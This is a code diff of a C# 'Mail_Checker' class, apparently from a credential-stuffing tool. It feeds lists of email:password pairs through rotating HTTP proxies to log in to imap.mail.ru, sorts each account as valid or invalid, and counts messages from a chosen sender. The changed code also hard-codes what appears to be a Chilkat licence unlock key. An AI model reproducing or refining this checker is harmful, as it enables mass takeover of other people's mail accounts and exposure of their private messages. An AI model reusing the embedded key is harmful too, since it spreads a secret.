@@ -1,15 +1,7 @@
-﻿using Limilabs.Client;
-using Limilabs.Client.IMAP;
-using Limilabs.Mail;
-using Limilabs.Proxy;
-using Limilabs.Proxy.Exceptions;
-using System;
+﻿using System;
 using System.Collections.Concurrent;
-using System.Collections.Generic;
-using System.IO;
-using System.Net.Sockets;
-using System.Security.Authentication;
 using System.Threading;
+using Chilkat;
 
 namespace Mail_Checker
 {
@@ -22,8 +14,7 @@ namespace Mail_Checker
         ConcurrentQueue<string> mails, proxys;
         string serv = "imap.mail.ru";
         string query;
-        ProxyFactory proxyMaker;
-        MailBuilder builder;
+
         int workingThreads = 0, errors = 0, valid = 0, novalid = 0;
         int threads, timeout;
         bool started = false;
@@ -36,8 +27,6 @@ namespace Mail_Checker
             this.threads = threads;
             this.timeout = timeout;
 
-            proxyMaker = new ProxyFactory();
-            builder = new MailBuilder();
         }
 
 
@@ -61,138 +50,139 @@ namespace Mail_Checker
             started = false;
         }
 
+
+
+
         void Check(object e)
         {
 
-
-            int messNum = 0;
-
-
-            string proxyLine;
-            if (proxys.TryDequeue(out proxyLine) == false)
-            {
-                ThreadPool.QueueUserWorkItem(new WaitCallback(Check));
-                return;
-            }
-            string[] proxyElements = proxyLine.Split(separs);
-
-
-            string mailLine;
-            if (mails.TryDequeue(out mailLine) == false)
-            {
-                proxys.Enqueue(proxyLine);
-                ThreadPool.QueueUserWorkItem(new WaitCallback(Check));
-                return;
-            }
-            string[] mailElements = mailLine.Split(separs);
-
             workingThreads++;
 
-            IProxyClient proxy = null;
-            Socket sock = null;
-            Imap connection = null;
 
-            try
+
+            while (mails.Count > 0 && proxys.Count > 0 && started)
             {
 
-                proxy = proxyMaker.CreateProxy(ProxyType.Http, proxyElements[0], Convert.ToInt32(proxyElements[1]));
-                proxy.ReceiveTimeout = TimeSpan.FromSeconds(timeout);
-                sock = proxy.Connect(serv, Imap.DefaultSSLPort);
+                Imap imap = new Imap();
+                imap.ConnectTimeout = timeout;
+                imap.ReadTimeout = timeout;
+                imap.Ssl = true;
+                imap.Port = 993;
 
-                connection = new Imap();
-                connection.ReceiveTimeout = TimeSpan.FromSeconds(timeout);
-                connection.AttachSSL(sock, serv);
-
-                connection.Login(mailElements[0], mailElements[1]);
-
-                connection.SelectInbox();
+                int messNum = 0;
 
 
-                List<long> UIDs = connection.GetAll();
-                List<MessageData> messages = connection.PeekSpecificHeadersByUID(UIDs, new string[] { "From" });
+                string proxyLine;
+                proxys.TryDequeue(out proxyLine);
+                string[] proxyElements = proxyLine.Split(separs);
 
 
-                for (int i = 0; i < messages.Count; i++)
+                string mailLine;
+                mails.TryDequeue(out mailLine);
+                string[] mailElements = mailLine.Split(separs);
+
+
+
+
+                bool success = true;
+                CheckErrors error = CheckErrors.noError;
+
+                imap.UnlockComponent("1QCDO-156DU-TN61L-13B9N-HQO0G");
+
+                
+                imap.HttpProxyHostname = proxyElements[0];
+                try
                 {
-                    IMail email = builder.CreateFromEml(messages[i].EmlData);
-                    if (email.Sender != null && email.Sender.Address != null && email.Sender.Address.Contains(query))
+                    imap.HttpProxyPort = Convert.ToInt32(proxyElements[1]);
+                }
+                catch (FormatException)
+                {
+                    success = false;
+                    error = CheckErrors.proxyError;
+                }
+
+                success = imap.Connect(serv);
+
+
+
+                if (success == true)
+                {
+                    success = imap.Login(mailElements[0], mailElements[1]);
+                }
+                else if (error == CheckErrors.noError) error = CheckErrors.proxyError;
+
+                if (success == true)
+                {
+                    success = imap.SelectMailbox("Inbox");
+                }
+                else if (error == CheckErrors.noError) error = CheckErrors.mailError;
+
+
+                MessageSet messageSet = null;
+                if (success == true)
+                {
+                    messageSet = imap.Search("ALL", true);
+                }
+                else if (error == CheckErrors.noError) error = CheckErrors.connectError;
+                //
+                EmailBundle bundle = null;
+                if (messageSet != null)
+                {
+                    bundle = imap.FetchHeaders(messageSet);
+                }
+                else if (error == CheckErrors.noError) error = CheckErrors.connectError;
+
+
+                if (bundle != null)
+                {
+                    for (int i = 0; i < bundle.MessageCount; i++)
                     {
-                        messNum++;
+                        if (bundle.GetEmail(i).FromAddress.Contains(query))
+                        {
+                            messNum++;
+                        }
                     }
-                    
+                }
+                else if (error == CheckErrors.noError) error = CheckErrors.connectError;
+                //
+
+                if (error == CheckErrors.proxyError)
+                {
+                    errors++;
+                    mails.Enqueue(mailLine);
+                }
+                else if (error == CheckErrors.noError)
+                {
+                    valid++;
+                    proxys.Enqueue(proxyLine);
+                }
+                else if (error == CheckErrors.mailError)
+                {
+                    novalid++;
+                    proxys.Enqueue(proxyLine);
+                }
+                else if (error == CheckErrors.connectError)
+                {
+                    errors++;
+                    mails.Enqueue(mailLine);
+                    proxys.Enqueue(proxyLine);
                 }
 
 
-                proxys.Enqueue(proxyLine);
 
-                valid++;
                 MailInfo mInfo = new MailInfo(mailElements[0], mailElements[1], messNum);
                 CheckState chState = new CheckState(mails.Count, proxys.Count, errors, valid, novalid, workingThreads);
-                OneCheckDone(this, new CheckEventArgs(CheckErrors.noError, mInfo, chState));
+                OneCheckDone(this, new CheckEventArgs(error, mInfo, chState));
 
 
-            }
-            catch (ProxyException)
-            {
-                errors++;
-                mails.Enqueue(mailLine);
-                CheckState chState = new CheckState(mails.Count, proxys.Count, errors, valid, novalid, workingThreads);
-                OneCheckDone(this, new CheckEventArgs(CheckErrors.proxyError, new MailInfo(), chState));
-            }
-            catch (SocketException)
-            {
-                errors++;
-                mails.Enqueue(mailLine);
-                CheckState chState = new CheckState(mails.Count, proxys.Count, errors, valid, novalid, workingThreads);
-                OneCheckDone(this, new CheckEventArgs(CheckErrors.proxyError, new MailInfo(), chState));
-            }
-            catch (IOException)
-            {
-                errors++;
-                mails.Enqueue(mailLine);
-                CheckState chState = new CheckState(mails.Count, proxys.Count, errors, valid, novalid, workingThreads);
-                OneCheckDone(this, new CheckEventArgs(CheckErrors.proxyError, new MailInfo(), chState));
-            }
-            catch (ImapResponseException)
-            {
-                novalid++;
-                proxys.Enqueue(proxyLine);
-                CheckState chState = new CheckState(mails.Count, proxys.Count, errors, valid, novalid, workingThreads);
-                OneCheckDone(this, new CheckEventArgs(CheckErrors.mailError, new MailInfo(), chState));
-            }
-            catch (ServerException)
-            {
-                errors++;
-                mails.Enqueue(mailLine);
-                CheckState chState = new CheckState(mails.Count, proxys.Count, errors, valid, novalid, workingThreads);
-                OneCheckDone(this, new CheckEventArgs(CheckErrors.proxyError, new MailInfo(), chState));
-            }
-            catch (AuthenticationException)
-            {
-                errors++;
-                mails.Enqueue(mailLine);
-                CheckState chState = new CheckState(mails.Count, proxys.Count, errors, valid, novalid, workingThreads);
-                OneCheckDone(this, new CheckEventArgs(CheckErrors.proxyError, new MailInfo(), chState));
+                imap.Disconnect();
+                imap.Dispose();
+
             }
 
-            if (connection != null)
-            {
-                //connection.Close();
-                connection.Dispose();
-            }
-            if (sock != null)
-            {
-                //sock.Close();
-                sock.Dispose();
-            }
-            if (proxy != null) proxy.Dispose();
+            
 
             workingThreads--;
-
-            if (mails.Count > 0 && proxys.Count > 0 && started)
-            {
-                ThreadPool.QueueUserWorkItem(new WaitCallback(Check));
-            }
 
         }
 
